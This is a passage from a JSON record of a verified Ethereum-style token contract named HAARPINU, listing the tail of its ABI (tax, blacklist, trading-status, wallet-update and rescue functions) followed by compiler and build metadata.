"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tAmount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"deductTransferRfi\",\"type\":\"bool\"}],\"name\":\"reflectionFromToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"rescueAnyERC20Tokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"rescueETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"secondOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"rfi\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"team\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_rfi\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_team\",\"type\":\"uint256\"}],\"name\":\"setSellTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_rfi\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_team\",\"type\":\"uint256\"}],\"name\":\"setTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"setTradingStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"rfi\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"team\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rAmount\",\"type\":\"uint256\"}],\"name\":\"tokenFromReflection\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totFeesPaid\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"rfi\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"team\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"updateAllowedTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"updateCooldown\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateDevelopmentWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"updateIsBlacklisted\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"}],\"name\":\"updateMaxTxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateMaxWalletlimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"updateSwapEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateSwapTokensAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"updateTeamWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HAARPINU", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}